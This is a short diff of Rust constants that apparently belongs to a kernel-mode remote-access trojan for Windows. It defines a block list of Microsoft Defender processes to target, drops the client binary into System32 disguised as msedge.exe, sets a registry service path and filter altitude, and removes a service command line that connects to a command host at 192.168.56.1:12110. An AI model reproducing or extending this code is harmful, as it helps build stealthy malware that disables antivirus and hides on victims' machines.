@@ -12,10 +12,13 @@ use widestring::{U16CStr, u16cstr};
 use crate::wrappers::lock::SpinLock;
 
 pub const MAX_INITIALIZE_ATTEMPTS: usize = 50;
+
+/// Path to the registry key of the user-mode service.
 pub const RAT_CLIENT_SERVICE_REGISTRY: &U16CStr = u16cstr!(formatcp!(
     "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\{RAT_CLIENT_SERVICE_NAME}"
 ));
 
+/// Process block list.
 pub const MS_DEFENDER_PROCESS_PATTERN: &[&U16CStr] = &[
     // u16cstr!("System32\\smartscreen.exe"),
     u16cstr!("System32\\SecurityHealthService.exe"),
@@ -29,11 +32,13 @@ pub const MS_DEFENDER_PROCESS_PATTERN: &[&U16CStr] = &[
 /// matches this pattern.
 pub const RAT_CLIENT_OBJ_PATH_SELF_DEFENSE: &U16CStr = u16cstr!("System32\\msedge.exe");
 
-pub const RAT_CLIENT_OBJ_PATH: &U16CStr = u16cstr!("\\SystemRoot\\System32\\msedge.exe");
-pub const RAT_CLIENT_SERVICE_PATH: &U16CStr = u16cstr!(formatcp!(
-    "\"%SystemRoot%\\System32\\msedge.exe\" --host 192.168.56.1:12110 --log-path \"%SystemRoot%\\System32\\violet.log\" --scm"
-));
+/// Path to the file to be dropped during initialization.
+pub const RAT_CLIENT_FILE_PATH: &U16CStr = u16cstr!("\\SystemRoot\\System32\\msedge.exe");
 
+/// Path to the service executable - SCM must understand this path.
+pub const RAT_CLIENT_SERVICE_PATH: &str = "%SystemRoot%\\System32\\msedge.exe";
+
+/// Altitude for certain filtering operations.
 pub const ALTITUDE: &U16CStr = u16cstr!("360000");
 
 pub const DOS_NAME: &U16CStr = u16cstr!(formatcp!("\\DosDevices\\{RAT_CLIENT_SERVICE_NAME}"));
